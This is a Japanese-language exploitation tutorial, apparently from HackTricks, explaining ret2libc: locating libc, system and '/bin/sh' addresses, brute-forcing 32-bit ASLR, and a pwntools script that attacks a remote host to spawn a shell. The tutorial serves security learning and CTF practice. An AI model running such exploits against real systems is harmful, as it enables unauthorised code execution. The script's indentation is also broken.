# Ret2lib

{{#include ../../../../banners/hacktricks-training.md}}

## **基本情報**

**Ret2Libc**の本質は、脆弱なプログラムの実行フローを攻撃者が提供したシェルコードをスタック上で実行するのではなく、共有ライブラリ内の関数（例：**system**、**execve**、**strcpy**）にリダイレクトすることです。攻撃者は、スタック上の戻りアドレスを目的のライブラリ関数を指すように変更するペイロードを作成し、呼び出し規約に従って必要な引数が正しく設定されるようにします。

### **例の手順（簡略化）**

- 呼び出す関数のアドレス（例：system）と呼び出すコマンド（例：/bin/sh）を取得する
- 最初の引数としてコマンド文字列を指すROPチェーンを生成し、関数への実行フローを渡す

## アドレスの特定

- 現在のマシンで使用されている`libc`がどこにメモリにロードされるかを見つけるには、次のコマンドを使用します：
```bash
ldd /path/to/executable | grep libc.so.6 #Address (if ASLR, then this change every time)
```
libcのアドレスがASLRによって変更されているか確認したい場合は、次のようにします:
```bash
for i in `seq 0 20`; do ldd ./<bin> | grep libc; done
```
- 使用されているlibcを知っていれば、次のように`system`関数へのオフセットを見つけることも可能です:
```bash
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
```
- 使用されているlibcを知っていれば、次のようにして`/bin/sh`関数へのオフセットを見つけることも可能です:
```bash
strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
```
### gdb-peda / GEFの使用

使用されているlibcを知っていると、PedaやGEFを使って**system**関数、**exit**関数、そして文字列**`/bin/sh`**のアドレスを取得することも可能です：
```
p system
p exit
find "/bin/sh"
```
### /proc/\<PID>/mapsの使用

プロセスが**子プロセス**を作成するたびに（ネットワークサーバーと話すとき）、そのファイルを**読み取る**ことを試みてください（おそらくroot権限が必要です）。

ここでは、プロセス内で**libcがどこにロードされているか**、およびプロセスのすべての子プロセスに対して**どこにロードされるか**を正確に見つけることができます。

![](<../../../../images/image (95).png>)

この場合、**0xb75dc000**にロードされています（これがlibcのベースアドレスになります）。

## 不明なlibc

バイナリがロードしている**libcがわからない**可能性があります（アクセスできないサーバーにあるかもしれません）。その場合、脆弱性を悪用して**いくつかのアドレスをリークし、どのlibc**ライブラリが使用されているかを見つけることができます：

{{#ref}}
rop-leaking-libc-address/
{{#endref}}

これに関しては、pwntoolsのテンプレートを見つけることができます：

{{#ref}}
rop-leaking-libc-address/rop-leaking-libc-template.md
{{#endref}}

## 32ビットでのASLRのバイパス

これらのブルートフォース攻撃は**32ビットシステムにのみ有効**です。

- エクスプロイトがローカルの場合、libcのベースアドレスをブルートフォースすることを試みることができます（32ビットシステムに有用）：
```python
for off in range(0xb7000000, 0xb8000000, 0x1000):
```
- リモートサーバーを攻撃する場合、**`libc`関数`usleep`のアドレスをブルートフォースする**ことを試みることができます。引数として10を渡します（例えば）。もしある時点で**サーバーが応答するのに10秒余分にかかる**場合、この関数のアドレスを見つけたことになります。

## One Gadget

{{#ref}}
../../one-gadget.md
{{#endref}}

## x86 Ret2lib コード例

この例では、ASLRブルートフォースがコードに統合されており、脆弱なバイナリはリモートサーバーにあります：
```python
from pwn import *

c = remote('192.168.85.181',20002)
c.recvline()

for off in range(0xb7000000, 0xb8000000, 0x1000):
p = ""
p += p32(off + 0x0003cb20) #system
p += "CCCC" #GARBAGE, could be address of exit()
p += p32(off + 0x001388da) #/bin/sh
payload = 'A'*0x20010 + p
c.send(payload)
c.interactive()
```
## x64 Ret2lib コード例

Check the example from:

{{#ref}}
../rop-return-oriented-programing.md
{{#endref}}

## Ret-into-printf (または puts)

これは、特定のデータを引数として `printf`/`puts` を呼び出すことで **プロセスから情報を漏洩させる** ことを可能にします。

## Ret2printf

これは基本的に、`ret2lib` を使用して `printf` フォーマット文字列の脆弱性に変換するために **Ret2libを悪用する** ことを意味します（無駄に思えるかもしれませんが可能です）：

{{#ref}}
../../format-strings/
{{#endref}}

## その他の例と参考文献

- [https://guyinatuxedo.github.io/08-bof_dynamic/csaw19_babyboi/index.html](https://guyinatuxedo.github.io/08-bof_dynamic/csaw19_babyboi/index.html)
- Ret2lib、libc内の関数のアドレスへの漏洩を考慮し、one gadgetを使用
- [https://guyinatuxedo.github.io/08-bof_dynamic/csawquals17_svc/index.html](https://guyinatuxedo.github.io/08-bof_dynamic/csawquals17_svc/index.html)
- 64ビット、ASLR有効だがPIEなし、最初のステップはカナリアのバイト0x00までオーバーフローを埋めてからputsを呼び出し、漏洩させる。カナリアを使ってROPガジェットを作成し、putsのGOTからのアドレスを漏洩させるためにputsを呼び出し、次に `system('/bin/sh')` を呼び出すROPガジェット。
- [https://guyinatuxedo.github.io/08-bof_dynamic/fb19_overfloat/index.html](https://guyinatuxedo.github.io/08-bof_dynamic/fb19_overfloat/index.html)
- 64ビット、ASLR有効、カナリアなし、子関数からのメインでのスタックオーバーフロー。ROPガジェットを使用してputsを呼び出し、GOTからputsのアドレスを漏洩させ、その後one gadgetを呼び出す。
- [https://guyinatuxedo.github.io/08-bof_dynamic/hs19_storytime/index.html](https://guyinatuxedo.github.io/08-bof_dynamic/hs19_storytime/index.html)
- 64ビット、PIEなし、カナリアなし、relroなし、nx。write関数を使用してwrite（libc）のアドレスを漏洩させ、one gadgetを呼び出す。

{{#include ../../../../banners/hacktricks-training.md}}
